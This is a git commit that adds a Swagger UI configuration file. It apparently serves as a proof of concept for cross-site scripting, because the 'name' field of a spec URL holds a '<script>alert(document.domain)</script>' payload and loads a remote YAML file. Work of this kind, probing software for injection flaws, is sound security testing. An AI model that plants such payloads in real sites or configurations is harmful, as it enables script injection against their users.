736f8d9b8af72a6a7e8fae26148358b3557ef302
Barsu4ara <petr.ulyanov@gmail.com>
2021-09-16 13:51:26 +0300

    Create 7cd720cfc5cec64af473687bc565cde9.js

---
+++ 7cd720cfc5cec64af473687bc565cde9.js
@@ -0,0 +1,13 @@
+{
+        dom_id: "#swagger-ui",
+        deepLinking: true,
+        presets: [SwaggerUIBundle.presets.apis, SwaggerUIStandalonePreset],
+        plugins: [SwaggerUIBundle.plugins.DownloadUrl],
+        layout: "StandaloneLayout",
+        urls: [
+            {
+                name: "<script>alert(document.domain)</script>",
+                url: "https://raw.githubusercontent.com/Barsu4ara/swagger/main/db3af614f66f9891d99d7547927e7a39.yaml"
+            }
+        ]
+    }
